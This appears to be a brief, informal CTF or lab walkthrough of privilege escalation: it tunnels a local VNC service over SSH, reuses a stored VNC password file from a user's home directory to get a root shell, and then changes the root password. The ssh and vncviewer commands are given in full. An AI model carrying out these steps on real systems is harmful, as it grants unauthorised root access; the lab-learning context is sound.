to scape our privilages to root with vnc running service ...


we need vnc password (which will be in encrypted form on remote host)
and we ha've to tunnel the vnc service to our host...


# ssh  -L 1234:127.0.0.1:5901   thomas@192.168.56.46 -p 65111

since we've user cred we can tunnel with ssh the port 5901 is running vnc...

and then after this we need password of vnc ....

in this case we've alredy .....which was located in user's home

#  .remote_seret i renamed it to(did not mean anything just i did)  >  .remotesecret

then make connection with this...


#  vncviewer -passwd .remotesecret localhost:1234 

this will open a prompt with root shell ....in my case i changed the root password with passwd command so that i can swich in ssh connection...
